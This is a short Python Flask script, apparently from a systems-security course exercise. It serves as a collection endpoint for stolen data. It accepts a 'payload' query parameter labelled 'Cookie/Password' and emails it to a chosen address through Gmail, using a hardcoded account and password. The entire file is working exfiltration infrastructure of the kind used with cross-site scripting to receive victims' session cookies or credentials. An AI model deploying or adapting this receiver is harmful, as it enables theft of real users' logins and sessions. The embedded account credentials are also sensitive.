#!/usr/bin/env python2

import smtplib, ssl

from flask import Flask
from flask import request
app = Flask(__name__)

@app.route('/', methods=['GET'])
def email_server():
    arg1 = request.args.get('to', None)
    arg2 = request.args.get('payload', None)
 
    if arg1 is None or arg2 is None:
        return 'Error: Missing parameters'
    else:        
      port = 465
      smtp_server = "smtp.gmail.com"
      sender_email = "ijustwanttograduatefromsutd@gmail.com" 
      receiver_email = arg1 
      password = "iluvsyssec"
      message = 'Subject: {}\n\n{}'.format("The good stuff", "Cookie/Password: " + arg2)
      
      context = ssl.create_default_context()
      with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
          server.login(sender_email, password)
          server.sendmail(sender_email, receiver_email, message)
      
      return 'to=' + arg1 + ', payload=' + arg2
      
app.run(host='0.0.0.0', port=8000, debug=True)